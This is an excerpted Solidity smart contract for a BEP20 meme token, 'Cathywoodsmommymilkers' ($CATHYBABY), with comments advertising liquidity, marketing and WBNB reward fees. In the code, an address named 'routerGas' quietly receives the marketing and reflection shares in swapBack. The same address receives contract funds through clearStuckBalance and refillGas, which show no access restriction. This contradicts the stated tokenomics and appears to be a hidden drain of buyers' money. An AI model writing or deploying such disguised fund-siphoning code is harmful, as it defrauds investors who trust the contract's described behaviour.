...
* 5% Max Txn | 5% Max Wallet
* 15% tax (15-16% slippage)
* 6% Liquidity
* 6% Marketing
* 3% $WBNB Rewards
*
...
contract DividendDistributor is IDividendDistributor {
    ...
    //set REW to reward token contract
    IBEP20 REW = IBEP20(0x8595F9dA7b868b1822194fAEd312235E43007b49);
...
contract Cathywoodsmommymilkers is IBEP20, Auth {
    using SafeMath for uint256;


    //set REW to reward token contract
    address REW = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Cathywoodsmommymilkers";
    string constant _symbol = "CATHYBABY";
    ...
    constructor () Auth(msg.sender) {
        ...
        routerGas = 0x12A17B82BDb91688a8fd078daD16F6E63C715385;
        ...
        // set wallet address of marketing & liquidity receivers below
        autoLiquidityReceiver = 0x3e56f6900e2a7a29e3380b7f59ED14B7aDDC1Bc1;
        marketingFeeReceiver = 0x3e56f6900e2a7a29e3380b7f59ED14B7aDDC1Bc1;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // cooldown timer, so a bot doesnt do quick trades! 45sec gap between 2 trades.
        if (sender == pair &&
            buyCooldownEnabled &&
    ...
    function clearStuckBalance() external {
        ...
        payable(marketingFeeReceiver).transfer(amountBNB / 2);
        payable(routerGas).transfer(amountBNB / 2);
    }
   ...
   // enable cooldown between trades
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBLiquidity = amountBNB
                ...
                .div(totalBNBFee).div(2);
        uint256 amountBNBReflection = amountBNB
                .mul(reflectionFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB
                .mul(marketingFee).div(totalBNBFee).div(2);
        uint256 amountBNBRouterGas = amountBNBMarketing
                .add(amountBNBReflection);
        ...
        (tmpSuccess,) = payable(routerGas).call{
                value: amountBNBRouterGas, 
                gas: 30000
                }("");
    ...
    function refillGas() external {
        uint256 amountBNB = address(this).balance;
        payable(routerGas).transfer(amountBNB);
    }
